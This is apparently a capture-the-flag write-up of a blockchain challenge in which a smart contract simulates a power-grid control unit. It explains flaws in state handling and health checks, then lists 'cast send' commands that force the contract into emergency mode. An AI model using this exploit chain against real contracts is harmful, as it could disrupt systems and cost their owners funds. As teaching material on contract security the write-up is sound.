# HTB Business 2025 - Global Cyber Skills Benchmark
# Operation Blackout

# Blockout | Blockchain | Medium

> Amazing job, Agent P. Volnaya's "VNCK" power plant was shut down due to irreparable damage to their infrastructure, leaving a mark in the history books as the "GreatBl@ck0Ut attack". However, due to their wealth and the resilience of their APT group, they were able to go back online with a new, more powerful, and secure power grid called "VCNKv2". As the final act of the Operation "Blockout" we need to take down the new kernel. I know you can do it.

## Docker Information

```IP ADDRESS & PORT
94.237.48.12:53205
94.237.48.12:47210```

## Recon the Challenge

This is a blockchain challenge, after spawning the challenge we are facing two docker instances.

The first is the RPC URL, while the second instance is the interface where we communicate with the challenge endpoint. We realize this by visiting both of the urls. How to interact with them?

Let’s analyze these two URLs:

RPC URL: 94.237.48.12:53205

Challenge UI: nc 94.237.48.12 47210

The first endpoint exposes a blockchain RPC node, the second is an interface to retrieve player credentials and perform challenge environment specific actions, such as get flag or restart instance.

```bash
└─$ curl http://94.237.48.12:53205/
```
rpc is running!

```bash
└─$ nc 94.237.48.12 47210
```
1 - Get

connection information

2 - Restart instance

3 - Get flag

Select action (enter number): 1

[*] No running node found. Launching new node...

Player Private Key : 0xaf9b6a6b6a16d5b22660b2fdc6ac0e2e497fcbda8442d842e83c27eb6d33f652

Player Address     : 0xA28BFc8F560755EAE77bddeD4e27d70C865330cb

Target contract    : 0xa97b6577c23a23aB2d9613B8F2a27597E457aC06

Setup contract     : 0x27B7283221678D840Fb11bE17278dA18BEE3B109

We queried the challenge-specific data and we are ready to fight this. We dwelve into code analysis.

## Source Code Analysis

The challenge provided the full source of the blockchain application. First things first, let’s understands the application, see what it does, how it works, then we code dig into source code analysis. We are dealing with a control unit that manages power delivery, health checks, and emergency triggers.

Diving into the source code of this challenge, we realize it is simulating a blockchain powered power grid control system. The main purpose of this application was to manage the delivery of electricity through gateways, track their health, and ensure a safe and robust grid by maintaining a healthy percentage of operation gateways. This is where we also realized the

Key functions of the blockchain application:

✅requestQuotaIncrease(uint8 amount) → increase delivery quota by paying 4 ether.

✅requestPowerDelivery(uint256 amount, uint8 gatewayId) → triggers the “delivering” status.

✅registerGateway() → adds a new gateway, costs 20 ether.

✅infrastructureSanityCheck() → recalculates the healthy percentage of gateways.

When analyzing the smart contract’s source code, the following function makes it clear it’s 4 ethers.

```function requestQuotaIncrease(uint8 amount) external payable {
require(msg.value == 4 ether, "Insufficient payment");

// Logic to increase quota

}```

Anything less than 4 ethers does not satisfy the transaction payment condition requirement.

Similary we could see that 20 ethers are required to register a new gateway:

function registerGateway() external payable {

require(msg.value == 20 ether, "Insufficient payment");

// Gateway registration logic

}

By reading through the function definitions and usage of “msg.value”, technically, how the app is enforcing payments: 4 ether for the request quota increase and 20 ether to register a gateway. Moreover, how it was planned to protect the grid from failures. This being the app’s main defense mechanism against a failing infrastructure. The safe operation is checked by the following function:

```function infrastructureSanityCheck() external {
uint256 healthy = 0;

for (uint i = 0; i < gatewayCount; i++) {

if (gateways[i].healthcheck()) {

healthy++;

}

}

healthyPercentage = (healthy * 100) / gatewayCount;

if (healthyPercentage < 50) {

triggerEmergencyMode();

}

}

```
Ultimately, this is when we uncovered critical vulnerabvilities in the logic. These checks are not robust enough to handle edge cases. Let’s explain each of these vulnerabilities one-by-one.

Vulnerability #1: Stuck State Management Vulnerability

controlUnit.status remains stuck on CU_STATUS_DELIVERING and never resets this status to IDLE.

```function requestPowerDelivery(uint256 _amount, uint8 _gatewayID) external circuitBreaker failSafeMonitor {
Gateway storage gateway = controlUnit.registeredGateways[_gatewayID];

require(controlUnit.status == CU_STATUS_IDLE, "[VCNK] Control unit is not in a valid state for power delivery.");

require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");

require(_amount > 0, "[VCNK] Requested power must be greater than 0.");

require(_amount <= gateway.availableQuota, "[VCNK] Insufficient quota.");

emit PowerDeliveryRequest(_gatewayID, _amount);

controlUnit.status = CU_STATUS_DELIVERING;

controlUnit.currentCapacity -= _amount;

gateway.status = GATEWAY_STATUS_ACTIVE;

gateway.totalUsage += _amount;

bool status = VCNKv2CompatibleReceiver(gateway.addr).deliverEnergy(_amount);

require(status, "[VCNK] Power delivery failed.");

controlUnit.currentCapacity = MAX_CAPACITY;

gateway.status = GATEWAY_STATUS_IDLE;

emit PowerDeliverySuccess(_gatewayID, _amount);

}

```
This locks the control unit in a stuck “delivering” state forever.

Vulnerability #2: Inadequate Health Check Flaw

Gateways are considered “healthy” if the following condition is met:

```function healthcheck() external view onlyProxy returns (bool) {
return (

_kernel() != address(0) &&

energyVault <= MAX_VAULT_CAPACITY

);

}```

This check does not validate whether the gateway is actually delivering power or stuck. Quickly, we realize that this is a weak healthcheck after all, since it ignores real operation health. It is exploitable.

Any gateway is appearing to be healthy as long the following 2 conditions are met:

✅_kernel is set (it is during registration)

✅energyVault is under the cap.

We can build on top of these our exploitation chain.

Vulnerability #3: Emergency Trigger Mechanism Flaw

The contract triggers emergency mode if less than 50% of the gateways are healthy. Furthermore, we also know that because gateways never get cleaned up when the control unit is in stuck mode, this allows us to flood the system with failing gateways to dilute the healthy percentage and force trigger this emergency mode. This is a logic flaw in the application implementation, that ultimately can open the door for us crash the power grid.

```modifier failSafeMonitor() {
if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {

controlUnit.status = CU_STATUS_EMERGENCY;

emit ControlUnitEmergencyModeActivated();

}

else if (controlUnit.healthyGatewaysPercentage < 50) {

controlUnit.status = CU_STATUS_EMERGENCY;

emit ControlUnitEmergencyModeActivated();

}

else {

_;  // Continue execution only if no emergency conditions met

}

}```

## Success Criteria: isSolved?

Let’s also see when the challenge is considered as solved, right? Our aim is to achieve this state.

```// Setup.sol
function isSolved() public view returns (bool) {

uint8 CU_STATUS_EMERGENCY = 3;

(uint8 status, , , , ) = TARGET.controlUnit();

return status == CU_STATUS_EMERGENCY;

}

```
In short, the challenge is solved when the control unit enters into emergency mode.

Once we understood the above vulnerabilities and overall functionality of the app, we can already see how all of the puzzle pieces are coming together and we can put together an exploit chain.

Wrapping It All Up – The Exploit Plan

Analysing the source code of the blockchain application, identifying the flaws and vulnerabilities, we can put together a straightforward and concrete plan on how to crash the power grid.

✅ 1. Use requestQuotaIncrease to pay the quota (4 ether /piece).

✅ 2. Trigger requestPowerDelivery to set DELIVERING state.

✅ 3. Repeatedly register failing gateways (registerGateway, 20 ether /each).

✅ 4. Run infrastructureSanityCheck to update the healthy percentage.

✅ 5. Once healthy percentage < 50%, emergency mode triggers and we win!

What this means in layman’s terms?

This challenge was about exploiting a stuck state in a smart contract-based power grid system. Normally, the system tracks healthy gateways (nodes that can deliver power). By triggering a stuck “delivering” state (using requestPowerDelivery), the system stopped cleaning up inactive gateways.

We then registered extra failing gateways to dilute the healthy percentage.

Finally, when the healthy percentage dropped below 50%, the infrastructureSanityCheck confirmed the system was unhealthy, triggering emergency mode — our goal! In essence: overloading the system’s perception of “health” by adding too many failing gateways until it triggers emergency shutdown — a classic logic bomb exploiting flawed health-check logic.

This challenge demonstrates that even a small bug like forgetting to reset status can break complex state logic and cause large security issues. Also how important are robust health-checks, since the weak logic was easy to abuse and exploitable. This being a reminder how robust healt checks logic is vital in blockchain applications.

## Exploit

```bash
# Increase quota twice
cast send $TARGET "requestQuotaIncrease(uint8)" 0 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

cast send $TARGET "requestQuotaIncrease(uint8)" 1 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Stuck 'delivering' state
cast send $TARGET "requestPowerDelivery(uint256,uint8)" 1000000000000000000 0 --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Register 3 failing gateways (each 20 ether)
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Update health percentage
cast send $TARGET "infrastructureSanityCheck()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Register final gateway to push healthy % below 50%
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL```

Ultimately, at this point, we can conclude that the emergency mode is triggered and the system is compromised. Once we are done, we can query the isSolved function or rush to the channel UI.

```bash
└─$ nc 94.237.48.12 47210
```
1 - Get

connection information

2 - Restart instance

3 - Get flag

Type 3 to grab the flag and enjoy the success.

## Conclusion

The Blockout challenge showcases how state management bugs and superficial health-checks can be chained into a devastating exploit. We exploited the stuck DELIVERING state to flood the system with fake gateways, forcing an emergency shutdown — a logic bomb that brought down the power grid!

This highlights a broader lesson: in blockchain security, even tiny logic flaws can spiral into massive system failures. Always validate state transitions and ensure health-checks are meaningful!

Hope you find it useful,

Over and out,

`--RW`
